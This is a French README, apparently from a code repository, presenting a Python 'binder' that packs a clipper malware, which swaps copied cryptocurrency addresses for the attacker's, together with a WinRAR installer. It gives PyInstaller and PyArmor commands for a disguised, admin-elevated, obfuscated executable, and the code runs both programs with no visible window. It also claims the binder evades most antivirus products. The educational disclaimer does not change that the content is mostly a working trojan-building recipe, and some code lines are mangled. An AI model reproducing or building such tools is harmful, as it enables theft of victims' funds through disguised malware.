# Recherche sur les Binders en Python

## Introduction

Dans le cadre de mes recherches sur la sécurité informatique et l'analyse de malwares, j'ai exploré le concept des binders. Un binder est un outil utilisé dans le domaine de la cybersécurité, principalement par les acteurs malveillants, pour combiner deux exécutables en un seul. L'objectif est souvent de dissimuler un logiciel malveillant (malware) derrière une application légitime, trompant ainsi l'utilisateur pour qu'il exécute inconsciemment le malware en même temps que l'application attendue.

## Objectif des Recherches

L'objectif de ces recherches est purement éducatif et vise à mieux comprendre les méthodes employées par les auteurs de malwares pour dissimuler et propager leurs créations. Aucun outil ou méthode décrit ici n'est destiné à être utilisé pour des activités malveillantes.

## Binder en Python

Pour illustrer concrètement le concept de binder, j'ai développé un prototype en Python. Ce binder spécifique fonctionne en mettant en parallèle deux fichiers exécutables : un programme légitime et un malware, permettant ainsi le téléchargement et l'exécution simultanés des deux applications.

### Technique et Outils Utilisés

Le code du binder est volontairement complexifié et obfusqué pour illustrer les techniques utilisées pour éviter la détection par les antivirus. Voici la commande utilisée pour compiler le binder en un fichier `.exe`:

```shell
pyinstaller --clean --noconsole --name "winrar-x32-624.exe" --add-data "WinRar-Componments.exe;." --add-data "winrar-x32-624fr.exe;." --uac-admin --icon icone.ico -F binder.py;
pyarmor gen -O obfdist --enable-jit --mix-str --assert-call --enable-rft --enable-bcc --pack dist/winrar-x32-624.exe binder.py
```

Cette commande utilise `PyInstaller` pour créer un fichier exécutable unique à partir du script Python, et `PyArmor` pour obfusquer le code. `PyArmor` est configuré pour utiliser des techniques avancées d'obfuscation telles que JIT compilation, mélange de chaînes, appels d'assertion, réflexion de type à l'exécution, et blocage de la continuité du code.


### Rapport Antivirus

Un rapport de VirusTotal pour l'exécutable compilé peut être consulté via le lien suivant : [Rapport VirusTotal](https://www.virustotal.com/gui/file/f051f25ee6a6ed2e57adb31c6ddb12de5aaf491168388a8dcc384ab6eaedea83). 

## Intégration d'un Clipper avec l'Installer de WinRAR

Dans le cadre de mes recherches, j'ai développé un prototype de binder en Python qui combine un clipper, stocké dans le même répertoire (`./clipper`), avec l'installer le plus banal de WinRAR. Le clipper est un type de malware conçu pour modifier les adresses de portefeuilles de cryptomonnaies copiées dans le presse-papiers en remplaçant l'adresse du destinataire par celle de l'attaquant.

### Code de Démonstration

```
import subprocess
import tempfile
import os
import sysdef 

get_resource_path(relative_path):
    """Retourne le chemin d'accès à la ressource incorporée, fonctionne pour le développement et le mode 'One-File'."""
    try:
        # PyInstaller crée un dossier temporaire et y stocke le chemin dans _MEIPASS
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")
    return os.path.join(base_path, relative_path)

def extract_and_run(executable_name):
    # Extraire l'exécutable dans un dossier temporaire
    temp_dir = tempfile.mkdtemp()
    temp_exe_path = os.path.join(temp_dir, executable_name)
    resource_path = get_resource_path(executable_name)    with open(resource_path, "rb") as source_file, open(temp_exe_path, "wb") as dest_file:
        dest_file.write(source_file.read())    # Exécuter l'exécutable
    subprocess.run(temp_exe_path, creationflags=subprocess.CREATE_NO_WINDOW)

if name == "main":
    extract_and_run("winrar-x32-624fr.exe")  # Exécution de l'installer de WinRAR
    extract_and_run("WinRar-Componments.exe")  # Exécution du clipper
```


### Bilan des Recherches

Il est important de noter que, dans le cadre de ces recherches, le binder reste non détecté par la plupart des solutions antivirus tant que le malware inclus n'est pas lui-même détecté.
Cette observation souligne l'importance pour les outils de sécurité de ne pas seulement chercher à identifier les signatures de malwares connus, mais aussi d'analyser les comportements suspects pouvant indiquer la présence d'un binder ou d'autres techniques de dissimulation.

## Conclusion

Les recherches sur les binders en Python démontrent la sophistication croissante des outils utilisés pour dissimuler et propager des malwares. En comprenant mieux ces techniques, la communauté de la cybersécurité peut développer de meilleures stratégies de détection et de prévention. Il est crucial de poursuivre l'exploration et l'éducation dans ce domaine pour anticiper et contrer les menaces émergentes.
